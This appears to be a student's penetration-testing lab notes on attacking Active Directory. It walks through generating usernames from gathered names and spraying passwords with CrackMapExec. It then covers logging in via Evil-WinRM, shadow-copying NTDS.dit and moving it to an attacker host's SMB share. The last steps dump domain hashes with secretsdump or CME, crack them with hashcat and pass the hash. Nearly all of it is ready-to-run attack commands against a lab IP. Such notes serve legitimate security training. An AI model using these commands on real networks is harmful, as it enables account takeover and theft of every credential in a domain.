![[ADauthentication_diagram.webp]]

###### Authentication Requests
Domain joined = Domain Controller
Non-Domain joined = SAM Database

### Dictionary Attack using CrackMapExec
*GPO might be enforcing a restricted number of logon attempts*

###### Typical Company Naming Conventions
| Username                              | Example         |
| ------------------------------------- | --------------- |
| firstinitial__lastname__              | jdoe            |
| firstinitial__middleinitial__lastname | jjdoe           |
| firstname__lastname__                 | janedoe         |
| firstname.__lastname__                | jane.doe        |
| lastname.__firstname__                | doe.jane        |
| nickname                              | doedoehackstuff |
***The companies email address structure is a good indicator of the usernames (jdoe@example.com)***

#### Create a Custom list of Usernames
[Username Anarchy](https://github.com/urbanadventurer/username-anarchy) can automate username generation.

Let's say these are the OSINT gathered names:
- Ben Williamson
- Bob Bergerstien
- Jim Stevenson
- Jill Johnson
- Jane Doe

```bash
./username-anarchy -i /path/to/names.txt
```

#### Launching the Attack
Get the password for the user(s)
```bash
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

#### Capture NTDS.dit
*Stored at ==%systemroot%/ntds== on the domain controller*

##### Use Evil-WinRM to connect to DC
```bash
evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'
```

##### 1. Check Local Group Membership
```cmd
net localgroup
```

We're checking to see if the account has local or domain admin rights. You need this to make a copy of the NTDS.dit file.

##### 2. Check User Account Privileges including Domain
```cmd
net user bwilliamson
```

This user has everything.

##### 3. Create Shadow Copy of C:
Use ==vssadmin== to create a [Volume Shadow Copy (VSS)](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) of whichever volume AD is on, most likely C: by default. Making a shadow copy copies the volumes that may be in use.

```Evil-WinRM cmd
vssadmin CREATE SHADOW /For=C:
```

##### 4. Copy NTDS.dit from VSS
Extract NTDS.dit to another location in prep for move to attack host.

```Evil-WinRM cmd
cmd.exe /c copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

##### 5. Transfer NTDS.dit to Attack Host
Using [[Attacking SAM]] extraction methods with impacket's smbserver.py we can move the .dit

```Evil-WinRM cmd
cmd.exe /c move C:\NTDS\NTDS.dit \\<IP>\<SHARE>
```

##### 6. Use Impacket-Secretsdump w/ HKLM\\SYS
```bash
impacket-secretsdump -ntds NTDS.dit -system SYS -hashes lmhash:nthash LOCAL -outputfile NTDS.hash
```
*Use hashcat afterwards*

***OR USE CME FOR FASTER RESULTS***

1. 
```bash
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@ssw0rd! --ntds
```
*This will dump all the hashes it can find to /home/user/.cme/logs/filename.ntds*

2. Crack with Hashcat
```bash
sudo hashcat -m 1000 <hash> <wordlist> 
```

***WHAT IF WE WEREN'T SUCCESSFUL CRACKING HASHES?***

##### Pass-the-Hash 
```bash
evil-winrm -i 10.129.201.57 -u Administrator -H "<HASH>"
```



